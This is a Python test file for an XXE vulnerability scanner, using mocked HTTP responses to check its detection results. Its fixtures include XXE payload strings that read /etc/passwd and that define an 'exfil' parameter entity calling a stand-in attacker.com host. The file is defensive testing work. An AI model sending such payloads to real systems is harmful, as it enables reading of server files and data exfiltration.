"""Tests for XMLExternalEntityAdvancedScanner."""
from unittest.mock import MagicMock
from tblue.scanner.xml_external_entity_advanced import XMLExternalEntityAdvancedScanner


def _scanner():
    s = XMLExternalEntityAdvancedScanner.__new__(XMLExternalEntityAdvancedScanner)
    s.http = MagicMock()
    return s


def _resp(text="", status=200, headers=None):
    r = MagicMock()
    r.status_code = status
    r.text = text
    r.headers = headers or {}
    return r


def test_external_entity_declaration():
    s = _scanner()
    s.http.get.return_value = _resp(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "xxe_external_entity_declaration" in types


def test_parameter_entity():
    s = _scanner()
    s.http.get.return_value = _resp(
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % exfil SYSTEM "http://attacker.com/x">]>'
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "xxe_parameter_entity" in types


def test_xml_error_disclosure():
    s = _scanner()
    s.http.get.return_value = _resp(
        'Error: SAXParseException at line 5 column 12: element not found'
    )
    results = s.scan("http://example.com")
    types = [r["type"] for r in results]
    assert "xxe_xml_error_disclosure" in types


def test_xxe_not_used():
    s = _scanner()
    s.http.get.return_value = _resp("<html>Regular HTML page</html>")
    results = s.scan("http://example.com")
    assert results[0]["type"] == "xxe_advanced_not_used"
    assert results[0]["status"] == "PASS"


def test_xxe_null_response():
    s = _scanner()
    s.http.get.return_value = None
    results = s.scan("http://example.com")
    assert results[0]["type"] == "xxe_advanced_not_used"
